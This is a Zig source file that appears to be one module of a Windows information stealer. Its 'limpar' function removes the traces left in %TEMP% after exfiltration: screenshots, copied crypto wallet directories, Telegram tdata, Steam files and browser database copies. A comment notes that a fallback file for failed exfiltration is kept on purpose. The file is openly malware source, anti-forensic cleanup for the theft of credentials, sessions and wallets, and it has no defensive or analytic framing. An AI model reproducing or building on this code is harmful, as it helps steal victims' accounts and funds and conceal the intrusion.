const std = @import("std");
const furtivo = @import("furtivo.zig");
const winfs = @import("winfs.zig");
const obf = @import("obf.zig");

// Cleanup all pipeta_* temp artifacts after exfiltration.
// Removes: screenshot, wallet dirs, tdata, steam, DB copies.
// NOTE: %TEMP%\pipeta_fallback.json is intentionally kept — it is the local
// fallback written when exfiltration fails, and deleting it would defeat it.
pub fn limpar(allocator: std.mem.Allocator) void {
    const temp = furtivo.getEnvVar(allocator, "TEMP") catch return;
    defer allocator.free(temp);

    // 1. Screenshot files (both .jpg and .bmp)
    const screen_jpg = std.fmt.allocPrint(allocator, "{s}\\pipeta_screen.jpg", .{temp}) catch return;
    defer allocator.free(screen_jpg);
    winfs.deleteFile(screen_jpg) catch {};

    const screen_bmp = std.fmt.allocPrint(allocator, "{s}\\pipeta_screen.bmp", .{temp}) catch return;
    defer allocator.free(screen_bmp);
    winfs.deleteFile(screen_bmp) catch {};

    // 2. Wallet extension directory (recursive)
    const wallets_dir = std.fmt.allocPrint(allocator, "{s}\\pipeta_wallets", .{temp}) catch return;
    defer allocator.free(wallets_dir);
    winfs.removeDirRecursive(allocator, wallets_dir);

    // 3. Desktop wallet directory (recursive)
    const wallets_desk_dir = std.fmt.allocPrint(allocator, "{s}\\pipeta_wallets_desk", .{temp}) catch return;
    defer allocator.free(wallets_desk_dir);
    winfs.removeDirRecursive(allocator, wallets_desk_dir);

    // 4. Telegram tdata directory (recursive)
    const tdata_dir = std.fmt.allocPrint(allocator, "{s}\\pipeta_tdata", .{temp}) catch return;
    defer allocator.free(tdata_dir);
    winfs.removeDirRecursive(allocator, tdata_dir);

    // 5. Steam directory (recursive)
    const steam_dir = std.fmt.allocPrint(allocator, "{s}\\pipeta_steam", .{temp}) catch return;
    defer allocator.free(steam_dir);
    winfs.removeDirRecursive(allocator, steam_dir);

    // 6. DB copy temp files (pipeta_db_copy_*.tmp pattern)
    // These are created by extrair.zig as *.pipeta_tmp
    // We scan %TEMP% for files matching pipeta_db_copy_*.tmp and *.pipeta_tmp
    cleanDbCopies(allocator, temp);
}

// Remove DB copy temp files by scanning %TEMP% directory.
fn cleanDbCopies(allocator: std.mem.Allocator, temp: []const u8) void {
    var dir_iter = winfs.DirIter.open(temp) orelse return;
    defer dir_iter.deinit();

    while (dir_iter.next(allocator)) |entry| {
        defer allocator.free(entry.name);

        if (entry.is_dir) continue;

        // Match pipeta_db_copy_*.tmp
        const name = entry.name;
        const prefix = "pipeta_db_copy_";
        const suffix = ".tmp";
        if (name.len >= prefix.len + suffix.len and
            std.mem.startsWith(u8, name, prefix) and
            std.mem.endsWith(u8, name, suffix))
        {
            const full = std.fs.path.join(allocator, &[_][]const u8{ temp, name }) catch continue;
            defer allocator.free(full);
            winfs.deleteFile(full) catch {};
            continue;
        }

        // Match *.pipeta_tmp (from extrair.zig)
        const pipeta_tmp = ".pipeta_tmp";
        if (name.len > pipeta_tmp.len and std.mem.endsWith(u8, name, pipeta_tmp)) {
            const full = std.fs.path.join(allocator, &[_][]const u8{ temp, name }) catch continue;
            defer allocator.free(full);
            winfs.deleteFile(full) catch {};
        }
    }
}
